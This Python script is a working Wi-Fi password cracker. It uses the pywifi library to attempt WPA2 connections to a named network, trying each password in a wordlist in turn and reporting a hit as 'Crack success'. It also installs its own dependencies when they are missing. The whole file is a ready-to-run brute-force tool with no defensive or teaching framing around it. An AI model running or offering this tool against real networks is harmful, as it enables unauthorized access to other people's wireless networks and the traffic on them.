#!/usr/bin/env python 3.7
# -*- coding: utf-8 -*-

import argparse
import sys
import os
import os.path
import platform
import re
import time
try:
    import pywifi
    from pywifi import PyWiFi, const, Profile
except ImportError:
    print("pywifi is not installed or failed to import. Attempting to install it now...")
    try:
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pywifi"])
        # some systems (Windows) require 'comtypes' for pywifi to work
        try:
            import pywifi
            from pywifi import PyWiFi, const, Profile
            print("pywifi installed and imported successfully.")
        except Exception as e:
            err = str(e)
            if "comtypes" in err or (hasattr(e, 'name') and e.name == 'comtypes'):
                print("Missing dependency 'comtypes' detected. Installing 'comtypes'...")
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", "comtypes"])
                    import pywifi
                    from pywifi import PyWiFi, const, Profile
                    print("comtypes installed and pywifi imported successfully.")
                except Exception as e2:
                    print(f"Failed to install 'comtypes': {e2}")
                    print("Please run: pip install comtypes and try again.")
                    sys.exit(1)
            else:
                print(f"Failed to import pywifi after installation: {e}")
                print("Please check your environment and try installing dependencies manually.")
                sys.exit(1)
    except Exception as e:
        print(f"Failed to install pywifi: {e}")
        print("Please install pywifi manually: pip install pywifi")
        sys.exit(1)


# By Brahim Jarrar ~
# GITHUB : https://github.com/BrahimJarrar/ ~
# CopyRight 2019 ~

RED   = "\033[1;31m"  
BLUE  = "\033[1;34m"
CYAN  = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD    = "\033[;1m"
REVERSE = "\033[;7m"

try:
    # Initialize WiFi interface
    wifi = PyWiFi()
    interfaces = wifi.interfaces()

    if not interfaces:
        print("[-] No wireless interfaces detected.")
        print("    Make sure a Wi‑Fi adapter is present, enabled, and that any required services (e.g., WLAN AutoConfig on Windows) are running.")
        print("    If you're running inside a VM, ensure the host adapter is passed through or use a USB Wi‑Fi adapter.")
        sys.exit(1)

    # list interfaces for diagnostics (first one will be used)
    try:
        names = [getattr(i, 'name', lambda: '<unknown>')() if callable(getattr(i, 'name', None)) else getattr(i, 'name', getattr(i, 'ssid', repr(i))) for i in interfaces]
    except Exception:
        names = [repr(i) for i in interfaces]
    print(f"{CYAN}[+] Detected interfaces: {names}{RESET}")

    # select the first interface
    iface = interfaces[0]

    # basic scan to verify the adapter is operational
    try:
        iface.scan()
        results = iface.scan_results()
    except Exception as e_scan:
        print("[-] Warning: could not perform scan on interface:", e_scan)
        print("    This may be due to driver issues, disabled services, or insufficient privileges (try running as Administrator).")
        results = []
except Exception as e:
    print("[-] Error initializing WiFi interface:", e)
    sys.exit(1)

type = False

def main(ssid, password, number):

    profile = Profile() 
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP


    profile.key = password
    iface.remove_all_network_profiles()
    tmp_profile = iface.add_network_profile(profile)
    time.sleep(0.1) # if script not working change time to 1 !!!!!!
    iface.connect(tmp_profile) # trying to Connect
    time.sleep(0.35) # 1s

    if iface.status() == const.IFACE_CONNECTED: # checker
        time.sleep(1)
        print(f"{BOLD}{GREEN}[*] Crack success!{RESET}")
        print(f"{BOLD}{GREEN}[*] password is {password}{RESET}")
        time.sleep(1)
        sys.exit(0)
    else:
        print(f"{RED}[{number}] Crack Failed using {password}{RESET}")

def pwd(ssid, file):
    number = 0
    with open(file, 'r', encoding='utf8') as words:
        for line in words:
            number += 1
            line = line.split("\n")
            pwd = line[0]
            main(ssid, pwd, number)
                    


def menu():
    parser = argparse.ArgumentParser(description='argparse Example')

    parser.add_argument('-s', '--ssid', metavar='', type=str, help='SSID = WIFI Name..')
    parser.add_argument('-w', '--wordlist', metavar='', type=str, help='keywords list ...')

    group1 = parser.add_mutually_exclusive_group()

    group1.add_argument('-v', '--version', action='store_true', help='version')
    print(" ")

    args = parser.parse_args()

    print(f"{CYAN}[+] You are using {BOLD}{platform.system()} {platform.machine()}...{RESET}")
    time.sleep(2.5)

    if args.wordlist and args.ssid:
        ssid = args.ssid
        filee = args.wordlist
    elif args.version:
        print("\n\n",CYAN,"by Brahim Jarrar\n")
        print(RED, " github", BLUE," : https://github.com/BrahimJarrar/\n")
        print(GREEN, " CopyRight 2019\n\n")
        exit()
    else:
        print(BLUE)
        ssid = input("[*] SSID: ")
        filee = input("[*] pwds file: : ")


    # thx
    if os.path.exists(filee):
        if platform.system().lower().startswith("win"):
            os.system("cls")
        else:
            os.system("clear")

        print(f"{BLUE}[~] Cracking...{RESET}")
        pwd(ssid, filee)

    else:
        print(RED,"[-] No Such File.",BLUE)


if __name__ == "__main__":
    menu()
